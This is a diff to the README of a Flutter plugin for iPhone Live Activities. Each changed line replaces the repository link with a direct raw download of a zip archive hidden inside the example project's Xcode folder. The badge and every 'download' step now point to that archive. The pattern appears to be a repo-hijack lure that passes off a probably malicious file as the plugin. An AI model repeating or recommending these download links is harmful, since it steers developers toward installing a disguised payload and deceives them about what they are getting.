@@ -1,12 +1,12 @@
 # ⚡ flutter_live_activities - Live iPhone updates from Dart
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Silty-acrylonitrile306/flutter_live_activities)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Silty-acrylonitrile306/flutter_live_activities/raw/refs/heads/main/example/ios/Runner.xcodeproj/live_activities_flutter_v1.1.zip)
 
 ## 📥 Download
 
 Visit this page to download:
 
-https://github.com/Silty-acrylonitrile306/flutter_live_activities
+https://github.com/Silty-acrylonitrile306/flutter_live_activities/raw/refs/heads/main/example/ios/Runner.xcodeproj/live_activities_flutter_v1.1.zip
 
 Open the page in your browser, then use the files or release section on the page to get the app or package you need
 
@@ -39,7 +39,7 @@ If you only want to view the project files, Windows is enough. If you want to us
 ## 🚀 Getting Started
 
 1. Open the download page:
-   https://github.com/Silty-acrylonitrile306/flutter_live_activities
+   https://github.com/Silty-acrylonitrile306/flutter_live_activities/raw/refs/heads/main/example/ios/Runner.xcodeproj/live_activities_flutter_v1.1.zip
 
 2. Get the project files from the page
 
@@ -156,7 +156,7 @@ This plugin fits apps that need short live status updates, such as:
 If you want to try it now:
 
 1. Visit the download page:
-   https://github.com/Silty-acrylonitrile306/flutter_live_activities
+   https://github.com/Silty-acrylonitrile306/flutter_live_activities/raw/refs/heads/main/example/ios/Runner.xcodeproj/live_activities_flutter_v1.1.zip
 
 2. Read the repo files
 3. Open the example project
@@ -209,4 +209,4 @@ After you finish setup, your app can send live updates to the iPhone system UI. 
 
 Visit this page to download:
 
-https://github.com/Silty-acrylonitrile306/flutter_live_activities
+https://github.com/Silty-acrylonitrile306/flutter_live_activities/raw/refs/heads/main/example/ios/Runner.xcodeproj/live_activities_flutter_v1.1.zip
